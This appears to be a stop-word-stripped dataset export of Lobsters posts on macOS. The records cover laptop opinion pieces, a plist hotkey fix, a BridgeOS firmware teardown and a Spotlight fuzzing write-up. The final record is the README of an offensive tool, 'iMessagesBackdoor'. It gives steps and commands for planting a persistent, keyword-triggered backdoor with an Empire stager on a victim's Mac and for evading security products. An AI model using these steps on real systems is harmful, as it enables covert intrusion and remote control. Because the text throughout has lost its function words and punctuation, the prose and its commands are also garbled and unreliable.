chap chopped made cute minipc alternatively could gaffer tape mac mini inside run cable cooling hole using little stick press power button two joined plank wood make neat coffee table turned side stacked suitability modified used chest drawer metal case generally resists corrosion nt stainless marine application limited seriously though aluminium case greatest strength greatest weakness downside huge send post upside solid genuinely impressive work engineering feel useful spare part object dart apple routinely mocked putting style ahead substance case superb example functional design work well also beautiful look indeed think even fan place still large empty space front memory chip enterprising storage vendor sold bracket could house extra hard drive space although bearing mind memory chip get hot sceptical would good idea often wonder apple could sold scaleddown case purely robust raid enclosure fan etc back geekbench dualprocessor score consuming watt power comparison unibody macbook pro laptop powered intel core duo score drawing watt process time intelpowered eightcore macintosh pro geekbenching value almost desktop pc intel geekbenches consuming watt one criticism levelled intelpowered macintosh pro despite classleading power edge ordinary core duo intel hardware nt justify cost another argument another blog post judging everymac figure last quadcore geekbenched impressive machine twelve year old imagine would still niche recording studio aforementioned motu audio interface appropriate version logic pro familiar workflow would disruptive change shudder think setup power consumption twelve year use logical next step difficult question apple intended replace intelpowered mac pro mac pro used basic case design albeit interior rejigged conceptually much combining multiple processor multiple drive bay plethora ram slot port however switch intel coincided new appreciation frugal computing many former owner opted one mac mini instead using usb latterly thunderbolt external storage macintosh pro discontinued apple intended professional user adopt nextgeneration mac pro tubular monstrosity defies description practice professional often switched imac assuming remained macintosh platform problem basic design philosophy mac pro monster processor tonne internal storage big case throwback past edge case standard desktop processor fast enough faster port mean external storage nt appreciably slower internal storage furthermore cloud continually eats away idea fat client kind top bottom graphic card dvi adc port hole wifi bluetooth antenna although machine connects internet without spdif line line usb firewire firewire ethernet modem small front panel power button headphone port usb firewire plugged usb hub three usb port nt enough nowadays magnificent example excess wild bunch sam pekinpah classic western came late stayed long came late lifespan three year time brief gone forever fifteen year later public appetite electricityguzzling computer great petrolguzzling car eg nil probably soldier recording studio happen given one free willing leave television turned never use oven perfectly usable albeit slow desktop computer cheapest macintosh desktop tower still generally usable even cheap intel atompowered window tablet outperforms get bored face difficult prospect selling live near small airfield might able use mean deicing aeroplane tire mine offer royal navy potential replacement amphibious assault craft one hand aluminium tendency melt high temperature hand rn strapped cash besides ship access huge amount seawater end edit writing decided see could get linux working year ago linux generally powerpc support although theoretical actual several distribution claimed support powerpc architecture people seemed got working debian easiest tried debian nt bother dualbooting popped spare hard drive installed thus swapping unixbased o x homemade unix clone unfortunately nt much cop firefox debian power macintosh failing load page stop used debian powerpc support dropped debian messing around partitioning installing appropriate firmware airport express working computer wifi surprisingly slow clunky dualprocessor pentium machine seven gigabyte memory perhaps nt using graphic card properly comparison o x sped along debian powerpc modern version firefox albeit modern version unusably slow nt render page fully browser either crashed immediately perhaps java problem step removed textmode browsing could fixed spending precious time reading fiveyearold forum post typing string arcane character terminal window nt care point software sell hardware saying go bought macbook pro money purely use logic android mobile phone run osmand could nt care le debian nothing want bin go
364,Lobsters,mac,Apple macOS,Fixing the MacBook Pro,https://marco.org/2017/11/24/fixing-the-macbook-pro,fixing macbook pro,love previous retina macbook pro magic keyboard macbook pro must return scissor keyswitches magic keyboard great firstparty usbc hub apple fullfeatured usbc accessory least port back away touch bar nicer charger keeping great,despite love previous retina macbook pro able use forever best laptop ever exist future past lot like new macbook pro need change truly great apple standard hoping see next macbook pro believe technically possible reasonable widely agreeable likely apple actually descending order importance magic keyboard butterfly keyswitches design failure abandoned controversial fatally unreliable expensive repair since introduction first macbook early flaw evident immediately yet apple brought entire macbook pro lineup late three significant revision apple butterfly keyswitches remain controversial unreliable ever best compromise acceptable ultrathin macbook nothing else fit place apple mainstream pro computer macbook pro must return scissor keyswitches apple change one thing next macbook pro far important anything else list fan butterfly keyboard feel need worry mean need old macbook pro keyboard exactly magic keyboard scissor switch feel similar bit travel reliability resilience previous keyboard generation much better reliable repairable balance thinness typing feel likely appeal far people even like butterfly keyboard magic keyboard need one change perfect macbook pro returning invertedt arrowkey arrangement making left rightarrow key halfheight arrangement much natural le errorprone align finger feeling shape crucial affordance frequently used key far home row great firstparty usbc hub macbook pro bet heavily usbc ecosystem developed enough people get need apple remotely competitive price go cheap thirdparty product often unreliable cause problem critical accessory flawless reflects poorly apple harm overall realworld experience using computer thirdparty hub dongle flaky owner blame blame expensive new apple computer needing apple need step solid offering offer port people need apple fullfeatured usbc accessory downright punitive unnecessary minimalism one usbc passthrough one usba aka regularold usb hdmi port even hz shameless price instead giving u least might possibly need type product give u fit within reasonable size cost bandwidth constraint like see least two usbc port least two usba port hdmi sdcard reader would nice bonus make easier go allusbc peripheral cable also like see true usbc hub one usbc least three usbc power passthrough one learned need pro display outsourced lg apple stop outsourcing critical adapter hub belkin good apple never port usbc great limited total port including power simply enough even adopt usbc ecosystem macbook pro limited predecessor macbook air connect power two usb device thunderbolt sd card simultaneously replacement macbook escape without touch bar connect two total device battery one powered macbook pro connect power two usb device two thunderbolt device hdmi output sd card simultaneously replacement connect four device battery three powered enough thunderbolt pcie bandwidth usbc port fine every port need usbc thunderbolt cost bandwidth unnecessary common realworld us laptop port power charging iphones external keyboard etc dongle exception norm realworld use owner need zero hdmi usba still far widely used removed completely neither likely fade away anytime soon regardless apple configures laptop readding hdmi least one usba port would reduce eliminate many people dongle need bet would dramatically improve satisfaction finally apple give serious consideration bringing back sdcard slot sd card widely used ever photography video audio specialized equipment provide excellent option fast reliable storage expansion data transfer going around wifi cable replace current us practice back away touch bar sorry flop solid try something new work shame apple recognize learn move touch bar either discontinued made optional macbook pro size configuration touch id part touch bar worth saving future clearly face id yet ideal setup touch id without touch bar retain secure enclave protection camera microphone hopefully get imac pro boot protection nicer charger usbc pd charging replaceable charging cable great advance kept usbc pd reason include battery life list occasional need extended battery life achieved inexpensive usbc pd battery apple could make charger cable much nicer need look recent past like see bring back charging led end cable cablemanagement arm brick superfluous served important useful function removal made realworld usability worse small unnecessary gain magsafe would nice think essential magsafe universally loved detached little vertical pressure used lap couch bed maybe could moved splitting module along cable inch laptop end like original xbox controller cable move detachable standard usbc cable preclude already specialized dedicated poweronly cable practice highwattage usb pd support thunderbolt limited usb speed thirdparty cable could still work apple could nicer keeping great lot current macbook pro great fast internals quieter fan touch id screen thunderbolt usbc pd charging space gray name choose better previous generation connectivity reliability versatility great one
365,Lobsters,mac,Apple macOS,Enabling the F4 key in macOS,https://boinkor.net/2017/11/enabling-the-f4-key-in-macos/,enabling key macos,bunch people tmux milder fix post,problem mystery figure bunch people hit mac o x macos since lion effect appears key hit without modifier disabled reason mainly rely function key mechanical keyboard switch window tmux eg hit thing according terminal actually work bunch forum advise deleting librarypreferencescomapplesymbolichotkeysplist also remove custom app shortcut bunch would prefer keep thank turn still get desired behavior milder fix main insight led fix outlined post symbolic hotkeys plist mapping key code parameter experimentation cooked command line try make sure create backup librarypreferencescomapplesymbolichotkeysplist file default write librarypreferencescomapplesymbolichotkeysplist applesymbolichotkeys dictadd enabled value parameter type standard think following add key plist stand according krypted blog post parameter guess make send keycode least harm standard key enables key logging back pressing key unmodified work custom app shortcut still win let know work
366,Lobsters,mac,Apple macOS,Under the Bridge: A quick tour of the BridgeOS 2.0 image,http://newosxbook.com/articles/BridgeOS.html,bridge quick tour bridgeos image,latest version decompressor,morpheus zephyr documentsiosbridgeos mv downloadsbridgeosupdatecustomerpkg morpheus zephyr documentsiosbridgeos l bridgeosupdatecustomerpkg macos pkg format xar archive unpack thus morpheus zephyr documentsiosbridgeos xar tvf bridgeosupdatecustomerpkg rwr r rootwheel bom rwr r rootwheel packageinfo rw rootwheel payload morpheus zephyr documentsiosbridgeos xar xvf bridgeosupdatecustomerpkg bom packageinfo payload morpheus zephyr documentsiosbridgeos file bom mac o x bill material bom file bridgeosupdatecustomerpkg xar archive version checksum packageinfo xml document text ascii text payload data nextstep legacy billofmaterials file read lsbom tell u file expect successful unpacking package morpheus zephyr documentsiosbridgeos lsbom bom head usr usrstandalone usrstandalonefirmware usrstandalonefirmwarebridgeoscustomerbundle usrstandalonefirmwarebridgeoscustomerbundlecontents usrstandalonefirmwarebridgeoscustomerbundlecontentsinfoplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresources usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesbuildmanifestplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip payload file pbzx apple favorite compression ota image wrote decompressor using latest version decompressor builtin liblzmaxz integration get morpheus zephyr documentsiosbridgeos cat payload pbzxpbzxmacos p flag chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte ok byte chunk flag length byte ok byte morpheus zephyr documentsiosbridgeos file p p ascii cpio archive odc xz data time pbzx contains raw chunk data uncompressed tool warns copy output normally nt cause error since cpio archive decompress morpheus zephyr documentsiosbridgeos mkdir x morpheus zephyr documentsiosbridgeos cd x morpheus zephyr documentsiosbridgeosx cat p cpio ivd usr usrstandalone usrstandalonefirmware usrstandalonefirmwarebridgeoscustomerbundle usrstandalonefirmwarebridgeoscustomerbundlecontents usrstandalonefirmwarebridgeoscustomerbundlecontentsinfoplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresources usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesbuildmanifestplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignature usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecodedirectory usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecoderequirements usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecoderesources usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecodesignature usrstandalonefirmwarebridgeoscustomerbundlecontentsversionplist obvious payload updatebundlezip could see lsbom output somewhere biggest file moment truth since anything corrupt downloadpbzxcpio zip wo nt decompress well morpheus zephyr documentsiosbridgeosx unzip usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip archive usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip creating metainf inflating metainfcomapplezipmetadataplist inflating infoplist creating boot inflating inflating bootbuildmanifestplist creating bootfirmware creating bootfirmwareaop inspect kernelcache morpheus zephyr documentsiosbridgeosx documentsworkjtooljoker dec mmapped feeding compressed kernelcache eh fine decompress compressed size uncompressed unknown crc unknown got kernel got mem mmapped kernel io later kernel io later exception vector file offset addr j line used ipads nt x line macbook pro touchbar used since used dec joker decompressed kernel tmp morpheus zephyr documentsiosbridgeosx l l tmpkernel rw morpheus wheel nov tmpkernel morpheus zephyr documentsiosbridgeosx jtool l tmpkernel lc mem text mem textconst mem textcstring cstring literal mem textoslog lc mem dataconst mem dataconstmodinitfunc module init function ptrs mem dataconstmodtermfunc module termination function ptrs mem dataconstconst lc mem textexec mem textexectext normal lc mem kld mem kldtext normal mem kldcstring cstring literal mem kldconst mem kldmodinitfunc module init function ptrs mem kldmodtermfunc module termination function ptrs mem kldbss zero fill lc mem last mem lastpinst mem lastmodinitfunc module init function ptrs mem lastlast zero fill lc mem data mem datadata mem datasysctlset mem datallvmprfcnts mem datallvmprfdata mem datallvmprfnames mem datallvmprfvnds mem databss zero fill mem datacommon zero fill lc mem prelinktext mem prelinktexttext lc mem plktextexec mem plktextexectext lc mem prelinkdata mem prelinkdatadata lc mem plkdataconst mem plkdataconstdata lc mem plkllvmcov mem plkllvmcovllvmcovmap lc mem plklinkedit mem plklinkeditdata lc mem prelinkinfo mem prelinkinfoinfo lc mem linkedit lc lcsymtab symbol table offset entry string table offset byte lc lcdysymtab local symbol external symbol index undefined symbol toc modtab indirect symbol lc lcuuid uuid lc lcbuildversion build version platform bridgeos lc lcsourceversion source version lc lcunixthread entry point lc lcfunctionstarts offset size morpheus zephyr documentsiosbridgeosx string tmpkernel grep darw darwin kernel version thu sep pdt root darwin morpheus zephyr documentsiosbridgeosx documentsworkjtooljoker k tmpkernel mmapped kernel io later kernel io later exception vector file offset addr mac framework pseudoextension comapplekpidsep private pseudoextension comapplekpiprivate io kit pseudoextension comapplekpiiokit libkern pseudoextension comapplekpilibkern bsd kernel pseudoextension comapplekpibsd applefscompressiontypezlib comappleapplefscompressionapplefscompressiontypezlib mach kernel pseudoextension comapplekpimach unsupported pseudoextension comapplekpiunsupported corecrypto comapplekeccorecrypto ioslowadaptiveclockingfamily comappleiokitioslowadaptiveclockingfamily io kit storage family comappleiokitiostoragefamily ioreportfamily comappleiokitioreportfamily applearmplatform comappledriverapplearmplatform applediskimagedriver comappledriverdiskimages applediskimageskernelbacked comappledriverdiskimageskernelbacked io kit pci family comappleiokitiopcifamily appleusbcommon comappledriverusbappleusbcommon io kit driver usb device comappledriverappleusbhostmergeproperties iousbdevicefamily comappleiokitiousbdevicefamily iokit serial port family comappleiokitioserialfamily applemobilefileintegrity comappledriverapplemobilefileintegrity iohidfamily comappleiokitiohidfamily io kit networking family comappleiokitionetworkingfamily ioskywalkfamily comappleiokitioskywalkfamily appleonboardserial comappledriverappleonboardserial ioaccessorymanager comappleiokitioaccessorymanager ioslaveprocessor comappledriverioslaveprocessor rtbuddy comappledriverrtbuddy applearmpmu comappledriverapplearmpmu appleembeddedtempsensor comappledriverappleembeddedtempsensor applesmc comappledriverapplesmc appleembeddedpcieuplinkmgmt comappledriverappleembeddedpcieuplinkmgmt applediskimagesudifdiskimage comappledriverdiskimagesudifdiskimage bridgeaudiopciep comappledriverapplebridgeaudiopciep appleusbdevicemux comappledriverappleusbdevicemux applehurricaneerrorhandler comappledriverapplehurricaneerrorhandler iodartfamily comappledriveriodartfamily applesamsungspi comappledriverapplesamsungspi pthread comapplekecpthread fairplayiokit comappledriverfairplayiokit iotextencryptionfamily comappleiotextencryptionfamily regular expression matching engine comapplekextapplematch seatbelt sandbox policy comapplesecuritysandbox iosurface comappleiokitiosurface apple scaler color space converter driver ioacceleratorfamily comappleiokitioacceleratorfamily applenandconfigaccess comappledriverapplenandconfigaccess applediagnosticdataaccessreadonly comappledriverapplediagnosticdataaccessreadonly iohdcpfamily comappleiokitiohdcpfamily libmkext comapplekeclibm iocecfamily comappleiokitiocecfamily ioavfamily comappleiokitioavfamily applediskimagesrambackingstore comappledriverdiskimagesrambackingstore applearmiisaudio comappleiokitapplearmiisaudio appleembeddedaudio comappledriverappleembeddedaudio iobuffercopyenginefamily comappleiokitiobuffercopyenginefamily applecsembeddedaudio comappledriverapplecsembeddedaudio iokit usb host family comappleiokitiousbhostfamily appleusbvhcicommon comappledriverusbappleusbvhcicommon vhci controller firmware driver comappledriverusbappleusbvhcifirmware appleeffaceablestorage comappledriverappleeffaceablestorage iocryptoacceleratorfamily comappleiokitiocryptoacceleratorfamily applesepmanager comappledriverapplesepmanager applesepkeystore comappledriverapplesepkeystore appleeffaceablenor comappledriverappleeffaceablenor applebcenorflashdeviceep comappledriverapplebcenorflashdeviceep applepmgr comappledriverapplepmgr lskdiokitmse comappledriverlskdiokitmse hf comapplefilesystemshfskext appleembeddedsimplespinorflasherdriver comappleappleembeddedsimplespinorflasher appleembeddedusb comappledriverappleembeddedusb applesynopsysotgdevice comappledriverapplesynopsysotgdevice appleembeddedlightsensor comappledriverappleembeddedlightsensor applesamsungserial comappledriverapplesamsungserial io kit hid event driver safe boot comappleiokitiohideventdriversafeboot applebsdkextstarter comappledriverapplebsdkextstarter provinfoiokit comappledriverprovinfoiokit appleembeddedpcie comappledriverappleembeddedpcie ionvmefamily comappleiokitionvmefamily applehidkeyboard comappledriverapplehidkeyboard iohidrelaymanager comappledriveriohidrelaymanager iotimesyncfamily comappleiokitiotimesyncfamily iobuffercopycontroller comappleiokitiobuffercopycontroller appleembeddedpupconfigmgmt comappledriverappleembeddedpupconfigmgmt iouserethernet comappleiokitiouserethernet applesepcredentialmanager comappledriverapplesepcredentialmanager applefirmwareupdatekext comappledriverapplefirmwareupdatekext macefimanager comappledrivermacefimanager applespu comappledriverapplespu appleaopaudio comappledriverappleaopaudio appleembeddedpupfirmwareservice comappledriverappleembeddedpupfirmwareservice appleusbethernetdevice comappledriverappleusbethernetdevice appleeffaceableblockdevice comappledriverappleeffaceableblockdevice io kit hid event driver comappleiokitiohideventdriver encryptedblockstorage comappleiokitencryptedblockstorage lskdiokit comappledriverlskdiokit apfs comapplefilesystemsapfs iomobilegraphicsfamily comappleiokitiomobilegraphicsfamily applemobileapnonce comappledriverapplemobileapnonce applediskimagesfilebackingstore comappledriverdiskimagesfilebackingstore avebridge comappleavebridge iohidrelayservice comappledriveriohidrelayservice appledialogpmu comappledriverappledialogpmu applebsdkextstartervpn comappledriverapplebsdkextstartervpn applessm comappledriverapplessm applediskimagesreadwritediskimage comappledriverdiskimagesreadwritediskimage video encoder appleinterruptcontroller comappledriverappleinterruptcontroller kernelrelaydevice comappledriverkernelrelaydevice applejpegdriver comappledriverapplejpegdriver applesart comappledriverapplesart applesynopsysmipidsi comappledriverapplesynopsysmipidsi applespmi comappledriverapplespmi appleusbnetworking comappledriverusbnetworking appleusbdevicencm comappledriverappleusbdevicencm iostreamfamily comappleiokitiostreamfamily applesamsungpke comappledriverapplesamsungpke applehidkeyboardembedded comappledriverapplehidkeyboardembedded applesummitlcd comappledriverapplesummitlcd got kexts definitely kernel apple iirc eos bridgeos version le aapl started using lcsourceversion latest jtool recognizes time cut numerous lcminversionxxxxxos still encrypted hmmph image put pbzx zip pbzx eludes morpheus zephyr documentsiosbridgeosx cat pbzxpbzxmacos p flag chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte morpheus zephyr documentsiosbridgeosx mkdir morpheus zephyr documentsiosbridgeosx cd morpheus zephyr documentsiosbridgeosxy otaa e p morpheus zephyr documentsiosbridgeosxy l f library system bin etc private sbin tmp usr morpheus zephyr documentsiosbridgeosxy l bin df p morpheus zephyr documentsiosbridgeosxy l sbin dmesg fsckhfs ifconfig mknod mountfdesc nologin route dynamicpager fstypmsdos kextunload mount mounthfs ping rtsol fsck fstypntfs launchd mountapfs newfsapfs umount fsckapfs halt mountdevfs newfshfs quotacheck morpheus zephyr documentsiosbridgeosxy l usrbin macefiutil buttontool hidutil sysdiagnose tailspin vmstat zprint morpheus zephyr documentsiosbridgeosxy l usrsbin ac distnoted ioreg rtadvd taskpolicy bridgeaudiod filecoordinationd notifyd sysctl cfprefsd gpt nvram syslogd morpheus zephyr documentsiosbridgeosxy l usrlibexec appleuvccamera diagnosticd misagent securityd crashhousekeeping eosd mobileobliterator seputil ioaccelmemoryinfocollector eostraced mobilewatchdog smcdiagnose lasecureiod fdrserviced msutil tailspind nandtaskscheduler fseventsd mtmergeprops telnetd usereventagent getty multiversed transitd amfid hidd nfcdrelay trustd aveserverd initdataprotection pathhelper upsshutdown bkremoted ioupsd pcapd vndevice bridgeosupdated keybagd relayd xartstoraged ccfipstest logd remotectl xpcproxy corebrightnessd lskdd rtbuddyd xpcroleaccountd dfrd lskdmsed sandboxd morpheus zephyr documentsiosbridgeosxy l library audio log mobiledevice keychains managed preference preference morpheus zephyr documentsiosbridgeosxy l f systemlibrary awd cachedelete framework preference accessoryupdaterbundles cache hidplugins privateframeworks appleusbdevice coreservices launchdaemons softwareupdatecertificates assettypedescriptors dfr multiverseplugins systemconfiguration audio extension obliteration usereventplugins bundle filesystems perl morpheus zephyr documentsiosbridgeosxy l f systemlibraryprivateframeworks apfsframework iomobileframebufferframework aggregatedictionaryframework loggingsupportframework aggregatedictionaryhistoryframework mediakitframework applefscompressionframework mobileaccessoryupdaterframework applejpegframework mobiledevicelinkframework mobileinstallationframework applesauceframework mobilekeybagframework assertionservicesframework mobileobliterationframework audioserverapplicationframework mobilesoftwareupdateframework audioserverdriverframework mobilesystemservicesframework baseboardframework multitouchsupportframework biometricsupportframework multiversesupportframework bomframework networkframework bridgeaccessibilitysupportframework networkstatisticsframework bridgexpcframework oauthframework commonauthframework osanalyticsframework coreanalyticsframework pasamplingframework corebrightnessframework powerlogframework coreservicesinternalframework protocolbufferframework corespeechframework remoteservicediscoveryframework coresymbolicationframework remotexpcframework crashreportersupportframework servicemanagementframework disframework streamingzipframework ezsocketsframework symbolicationframework embeddedossupportframework usermanagementframework fileproviderframework videotoolboxframework foundationodrframework voicetriggerframework gpusupportframework dfrdsupportframework graphicsservicesframework kperfframework heimdalframework kperfdataframework ioaccelmemoryinfoframework ktraceframework ioacceleratorframework morpheus zephyr documentsiosbridgeosxy l f systemlibraryframeworks avfaudioframework corefoundationframework imageioframework accelerateframework coregraphicsframework mobilecoreservicesframework audiotoolboxframework coremediaframework openglframework audiounitframework corevideoframework openglesframework cfnetworkframework foundationframework systemframework coreaudioframework gssframework systemconfigurationframework coredataframework iokitframework morpheus zephyr documentsiosbridgeosxy l privateetc asl fstab host network notifyconf passwd service aslconf group masterpasswd newsyslogd pamd protocol ttys morpheus zephyr documentsiosbridgeosxy head privateetcmasterpasswd user database file authoritative user database nobody unprivileged user varempty usrbinfalse root system administrator varroot binsh mobile mobile user varmobile binsh morpheus zephyr documentsiosbridgeosxy l systemlibrarycoreservices bridgeversionplist dumppanic reportcrash systemversionplist powerdbundle morpheus zephyr documentsiosbridgeosxy l systemlibrarycoreservicessystemversionplist systemlibrarycoreservicessystemversionplist morpheus zephyr documentsiosbridgeosxy cat systemlibrarycoreservicessystemversionplist xml version encoding doctype plist public appledtd plist http plist version dict key buildid key string string key productbuildversion key string string key productcopyright key string apple inc string key productname key string bridge o string key productversion key string string key systemimageid key string string dict plist
367,Lobsters,mac,Apple macOS,Staring into the Spotlight,https://blog.doyensec.com/2017/11/15/osx-spotlight.html,staring spotlight,staring spotlight fsevents importer official apple developer documentation crash file,staring spotlight nov posted john villamil spotlight pervasive seeing eye osx userland drink spout file event sprayed kernel neatly index thing later use amalgamation binary library neatly fitted together give user oversight box present interesting attack surface blog post explanation work one day found interesting looking crash recorded user name librarylogsdiagnosticreports yet crash target osx whenever file created filesystem event generated sent kernel spotlight listens event others immediately parse created file metadata fuzzing native file parser spotlight crash began appear mdworker process spotlight attempting index mutated input sample intending include search result later fsevents spotlight system overseen md open read devfsevents stream file system event information kernel instead dumping event disk like fseventsd dump event worker process parsed behalf spotlight md responsible delegating work managing mdworker process communicates mach messaging creates monitor kill mdworkers based light rule kernel block volume event streaming fsevents device quite lot md spawn mdworker process handling higher event magnitude guarantee see capture every single event kernel filter root level process read device mdworker process get spawned parse file write meta info die mdworker share lot code mdimport command line equivalent mdimport binary used debug test spotlight importer therefore make great target auditing fuzzing much talk regard mdimport also applies mdworker importer see mdworkers following sudo fsusage w f filesys mdworker importer found libraryspotlight systemlibraryspotlight bundle within latter chosen app typically run post install script mdimport r importer andor lsregister following command show list importer present laptop show third party apps installed importer mdimport l mdimport path id libraryspotlightibooksauthormdimporter libraryspotlightiworkmdimporter libraryspotlightmicrosoft officemdimporter systemlibraryspotlightapplicationmdimporter systemlibraryspotlightsystemprefsmdimporter systemlibraryspotlightvcardmdimporter applicationsxcodeappcontentsapplicationsapplication loaderappcontentslibraryspotlightmzspotlightmdimporter applicationslibreofficeappcontentslibraryspotlightooospotlightimportermdimporter applicationsomnigraffleappcontentslibraryspotlightomnigrafflemdimporter applicationsgaragebandappcontentslibraryspotlightlogicxmdimportmdimporter applicationsxcodeappcontentslibraryspotlightuuidmdimporter mdimporter file actually package holding binary binary attacking using mdimport simple mdimport file spotlight index metadata filetypes associated importer file type identified magic example mdimport read magic environment variable us directory contains compiled mgc file actual magic pattern format magic file discussed official apple developer documentation crash file one thing notice crash log contain helpful information cause following message get logged mdworker mdimport share much code application specific information import fstype hf uti comappletruetypedataforksuitcasefont plugin libraryspotlightfontmdimporter find suspect file using sudo mdutil inode reference number file question disk argument mdutil ask lookup file based volume id inode spit string performs open fcntl pseudo directory vol volume id file inode see info stat syscall file stat etc lrwxrxrx root wheel dec dec dec dec etc l afpovertcpcfg fstabhd network protocol alias ftpdconf newsyslogconf racoon aliasesdb ftpdconfdefault newsyslogd rccommon uti registered importer also shown case crash caused malformed datafork truetype suitcase dfont file find bug study lldb launch mdimport debugger crash file argument particular bug break exception systemlibraryspotlightfontmdimporter importer screenshot show problem procedure crashing instruction highlighted particular bug rsi register point memory mapped font file value read stored rax used offset rcx point text segment executable memory lookup done hardcoded table parsing proceeds integer read font file never validated writing reversing spotlight importer main symbol first look getmetadataforfile getmetadataforurl function receives path parse expected return metadata cfdictionary see stacktrace mdimport jump getmetadataforfile function font importer fuzzing mdimport straightforward crash signal easily caught variety importer present osx sometimes patched alongside framework library code shared however lot code unique binary represents nice attack surface spotlight system extensive including query language make great target research needed fuzzing general osx disable spotlight oversight folder generate remove input sample folder added system preference spotlight privacy fuzz mdimport folder instead disable spotlight run fuzzer different folder
368,Lobsters,mac,Apple macOS,The best laptop ever made,https://marco.org/2017/11/14/best-laptop-ever,best laptop ever made,,apple made many great laptop retina macbook pro epitome usefulness elegance practicality power overall package still may never surpassed introduced le year steve job died see peak job vision mac debut highdpi mac starting long road still finished allretina lineup allssd storage quadcore processor healthy amount ram standard every configuration fast capable pleasant use introduction criticized ditching optical drive ethernet port defensible welltimed removal neither could even come close physically fitting new design macbook pro user still using either regular basis almost none u needed buy external optical drive ethernet adapter fit new laptop life exchange removal got substantial reduction thickness weight huge new battery downside everything else machine upgrade thinner lighter faster better battery life quieter fan better speaker better microphone second thunderbolt port convenient new hdmi port magsafe power adapter break away safely tripped led connector quickly clearly silently indicates whether charging battery fully charged pair thunderbolt later thunderbolt port gave u highend highspeed connectivity needed pair standard usb port one side let u connect charge world standard usb device headphone jack thoughtfully located left side nearly headphone run cable left earcup externalmouse user also appreciate frequentlyused cable intruding rightside mousing area keyboard completely unremarkable best possible way crowdpleasing design neither fanatically loved widely despised quietly reliably job great tool nobody ever really think trackpad struck great balance size usability provided ample room multitouch gesture without large close keyboard people finger inadvertently brush typing every owner needed sdcard slot hdmi port provided time might greatly increased versatility convenience macbook pro many pro customer use av gear record sd card occasionally need plug tv projector sdcard slot could also serve inexpensive storage expansion power adapter builtin cable management keep bag tidy need longer cable extension come box additional charge versatile usba port allow traveler standardize one type charging cable charge iphones ipads laptop multiport wall car charger portable battery airplane many outlet nearly charger likely found world around revision brought modern force touch trackpad used space saving increase battery wh wh carryon limit commercial airline paired integratedonly gpu base configuration offered unparalleled option great battery life without giving large retina screen like backlit apple logo lid maybe oldfashioned maybe miss steve along magsafe led startup chime reminds time mac design celebrated personality humanity whimsy recently returned macbook pro year away apple still sell model brand new limited integratedonly gpu option prefer nongamer battery heat longevity advantage got mine lightly used le thought would feel like downgrade like going back time feared would feel thick heavy cumbersome expected look impossibly old feel delightful first got one fast capable reliable gracefully need barely heavier thicker got remove many accessory travel bag think actually coming ahead feel like professional tool made people love need computer top game designed u rather asking u adapt help u perform work rather adding workload peak best laptop ever existed hope best laptop ever exist
369,Lobsters,mac,Apple macOS,iMessagesBackdoor: An Event-Driven Persistent Backdoor for Mac OS X,https://github.com/checkyfuntime/iMessagesBackdoor,imessagesbackdoor eventdriven persistent backdoor mac o x,imessagesbackdoor explanation mailapp outlook note applescriptnamekey warning usage usage empire example run command message received todo,imessagesbackdoor script help set event handler order install persistent backdoor activated sending message note longer work newer version mac osx imessages removed ability applescript event handler explanation mailapp outlook used create persistent backdoor victim imessages mac o x also used order keep access victim machine imessages support applescript handler set execute shell command firing specific trigger example trigger received text invitation message sent message received login finished logout finished modifying preference gui set applescript handler defines happens event trigger however red team engagement likely want exclusively command line luckily able manually modify plist file order force application accept applescript handler imessages store preference file two location librarypreferencescomappleichatplist librarycontainerscomapplesoagentdatalibrarypreferencescomapplemessageshelperalertscontrollerplist second plist seems take precedence first testing note someone explain love know try open file text editor vim would get binary blob default macosx store plist file binary format however provide neat little tool used convert human readable xml format plutil convert librarycontainerscomapplesoagentdatalibrarypreferencescomapplemessageshelperalertscontrollerplist open file text editor see list key available preference file key going looking named applescriptnamekey key control applescript file defines handler script like modify order execute shell command best part modify already existing script order remain radar far security product concerned legitimate functionality modifying file want convert plist file back binary messagesapp need restarted application pick new preference done command line using following command plutil convert librarycontainerscomapplesoagentdatalibrarypreferencescomapplemessageshelperalertscontrollerplist killall message killall soagent warning cause application bounce user may notice application restarted although could also potentially patient wait user restart computer anytime victim receives message containing keyword shell command executed containing payload usage python imessagesbackdoorpy h handler handlername force delete verbose handler handlername name applescript file stored imessages configuration require scpt extension force force overwriting user current applescript event handler delete remove current script handler verbose display debugging message ex python imessagesbackdoorpy handler backdoor force usage empire order install empire backdoor target using imessages generate empire stager accordance instruction copy output event handler want control backdoor place file libraryapplication scriptscomappleichat libraryscriptsmessages message mountain lion run imessagesbackdoorpy command order set user preference run backdoor example run command message received copy output message received event handler within backdoorscpt replace helloworld keyword want use execute backdoor place file libraryapplication scriptscomappleichat terminal python imessagesbackdoorpy handler backdoor force send message target containing phrase get connection empire server todo take content username file display user easier see account send message better fix script order delete trace message user implement empire module
